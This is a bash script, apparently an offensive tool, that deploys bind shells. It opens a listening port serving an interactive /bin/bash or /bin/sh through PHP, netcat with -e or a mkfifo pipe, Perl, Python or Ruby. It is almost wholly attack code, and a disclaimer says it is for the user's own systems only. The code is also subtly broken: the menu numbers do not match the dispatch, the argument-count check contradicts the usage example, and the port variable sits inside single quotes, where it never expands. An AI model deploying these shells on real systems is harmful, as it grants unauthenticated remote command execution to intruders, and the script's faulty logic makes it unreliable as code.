#!/bin/bash

# THIS PROGRAM IS INTENDED TO BE USED ON YOUR OWN PERSONAL COMPUTER SYSTEMS, 
# PERIOD. 
# 
# USING THIS PROGRAM TO ATTACK, OR ATTEMPT TO ATTACK, OR EVEN ATTEMPT TO 
# CONNECT TO SYSTEMS THAT YOU ARE NOT EXPRESSLY AUTHORIZED TO ACCESS CAN 
# RESULT IN CRIMINAL PROSECUTION. 
# 
# ACCESSING SYSTEMS THAT ARE NOT YOUR OWN PERSONAL PROPERTY OR WHICH YOU DO 
# NOT HAVE EXPLICIT WRITTEN PERMISSION TO ACCESS IS CONSIDERED ILLEGAL NEARLY 
# EVERYWHERE.  
# 
# THE WRITER OF THIS PROGRAM WILL NOT BE HELD RESPONSIBLE FOR ILLEGAL ACTIONS 
# TAKEN BY ANYONE USING THIS PROGRAM.
#
# Quick Bind Shell Deployment Script
# By SpyFox
#

################## - VARIABLES - ##################

METHOD="$1"
PORT="$2"

#################### - BEGIN - ####################

usage_info(){
cat << "EOT"
USAGE: ./binder.sh <#1-6> IP PORT
EX: ./binder.sh 3 51337
OPTIONS:
 1) PHP
 2) NETCAT Traditional
 3) NETCAT OpenBsd
 4) Perl
 5) Python
 6) Ruby
EOT
exit 0;
}

PHP(){
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",$PORT);\
socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;\
$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);\
    socket_write($cl,$m,strlen($m));}}'
}

NETCAT(){
nc -nlvp $PORT -e /bin/bash
}

NETCAT_OPENBSD(){
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp $PORT >/tmp/f
}

Perl(){
perl -e 'use Socket;$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\
bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\
close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
}

Python(){
python -c "exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",$PORT));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")"
}

Ruby(){
ruby -rsocket -e 'f=TCPServer.new($PORT);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
}

############################ - MAIN - ############################

if [ -z "$1" ] || [ "$#" -ne 3 ] || [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
	usage_info
else 
	if [ "$1" -eq 1 ]; then
		echo
		PHP
	fi
	if [ "$1" -eq 2 ]; then
		echo
		NETCAT
	fi
	if [ "$1" -eq 3 ]; then
		echo
		NETCAT_OPENBSD
	fi
	if [ "$1" -eq 5 ]; then
		echo
		Perl
	fi
	if [ "$1" -eq 6 ]; then
		echo
		Python
	fi
	if [ "$1" -eq 7 ]; then
		echo
		Ruby
	fi
fi
